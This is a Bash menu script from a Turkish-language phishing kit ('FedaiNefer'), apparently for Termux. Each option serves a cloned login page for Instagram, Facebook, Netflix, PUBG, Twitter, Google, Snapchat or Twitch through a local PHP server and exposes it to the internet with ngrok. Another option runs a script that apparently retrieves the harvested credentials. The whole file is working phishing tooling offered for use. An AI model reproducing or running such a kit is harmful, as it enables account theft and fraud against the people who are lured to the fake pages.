#!/bin/bash
#Code: FedaiNefer
chmod 777 link_ver.sh
clear
echo""
echo ""
echo -e "\033[31;40;1m

                         \e[36m           FedaiNefer
                           \e[32m*******************************

                    \e[31m[\e[32m01\e[31m]\e[37minstagram phishing     \e[31m[\e[32m02\e[31m]\e[37mfacebook phishing

                    \e[31m[\e[32m03\e[31m]\e[37mnetflix phishing       \e[31m[\e[32m04\e[31m]\e[37mpubg phising

                    \e[31m[\e[32m05\e[31m]\e[37mtwitter phishing       \e[31m[\e[32m06\e[31m]\e[37mgoogle phishing

		    \e[31m[\e[32m07\e[31m]\e[37minstagram panel        \e[31m[\e[32m08\e[31m]\e[37mfacebook panel

		    \e[31m[\e[32m09\e[31m]\e[37msnapchat phishing      \e[31m[\e[32m10\e[31m]\e[37mtwitch phishing

                           \e[34m*******************************

                    \e[31m[\e[32m99\e[31m]\e[37mMenu\e[31                     \e[31m[\e[32m00\e[31m]\e[37mVeriler

                        "
read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m İşlem Numarası : ' islem

if [[ $islem == 01 ]]; then
	echo " "
        read -p "Port Giriniz: " port
	echo " "
        echo -e "\e[32mCode: instagram"
        sleep 2
        echo ''
        echo -e "\e[33mPhp Server && Ngrok Servisi Başlatılıyor..."
        sleep 4
	cd Siteler
        cd instagram &&
        php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[ $islem == 03 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: netflix"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Servisi Başlatılıyor..."
        sleep 4
	cd Siteler
        cd netflix_phishing &&
        php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[  $islem == 04 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: pubg"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Servisi Başlatılıyor..."
        sleep 4
	cd Siteler
        cd pubg_phishing &&
        php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[  $islem == 05 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: twitter"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Servisi Başlatılıyor..."
        sleep 4
	cd Siteler
        cd twitter_phishing &&
        php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[ $islem == 06 ]]; then

	read -p "Port Giriniz: " port
	echo -e "\e[32mCode: google"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Servisi Başlatılıyor..."
        sleep 4
        cd Siteler
	cd google
	php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[ $islem == 02 ]]; then

        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: facebook"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Servisi Başlatılıyor..."
        sleep 4
	cd Siteler
        cd facebook_phishing &&
        php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[ $islem == 08 ]]; then
	read -p "Port Giriniz: " port
        echo -e "\e[32mCode: facebook_panel"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Servisi Başlatılıyor..."
        sleep 4
	cd Siteler
        cd facebook_panel_phishing &&
        php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[ $islem == 07 ]]; then
	" "
	read -p "Port Giriniz: " port
        echo -e "\e[32mCode: instagram_panel"
        sleep 2
	echo ''
        echo -e "\e[33mPhp Server && Ngrok Servisi Başlatılıyor..."
        sleep 4
	cd Siteler
	cd instagram_panel_phishing
	php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[ $islem == 09 ]]; then
	echo	" "
	read -p "Port Giriniz: " port
	echo -e "\e[32mCode: snapchat"
	sleep 2
        echo ''
        echo -e "\e[33mPhp Server && Ngrok Servisi Başlatılıyor..."
        sleep 4
	cd /data/data/com.termux/files/home/FedaiNefer_Phishing/Siteler/snapchat
	php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[ $islem == 10 ]]; then
	echo " "
	read -p "Port Giriniz: " port
	echo -e "\e[32mCode: twitch"
	sleep 2
	echo " "
	echo -e "\e[33mPhp Server && Ngrok Servisi Başlatılıyor..."
        sleep 4
        cd /data/data/com.termux/files/home/FedaiNefer_Phishing/Siteler/twitch
        php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[ $islem == 99 ]]; then
	echo
        echo -e "\033[31;40;1mÇıkış Yapılıyor, Lütfen Bekleyiniz..."
	sleep 4
	clear
	cd ..
	echo -e "\033[31;40;1mÇıkış Yapıldı."
	sleep 3
	echo
	ls

elif [[ $islem == 00 ]]; then
	echo ""
	echo -e "\e[33mLütfen Bekleyiniz..."
	sleep 4
	cd ..
        bash verileri_getir.sh
else
        clear
        echo ""
        echo -e '\033[31;40;1m Böyle bir İşlem Numarası bulunmamaktadır, Lütfen daha dikkatli olun..'
        sleep 5
        bash link_ver.sh
fi
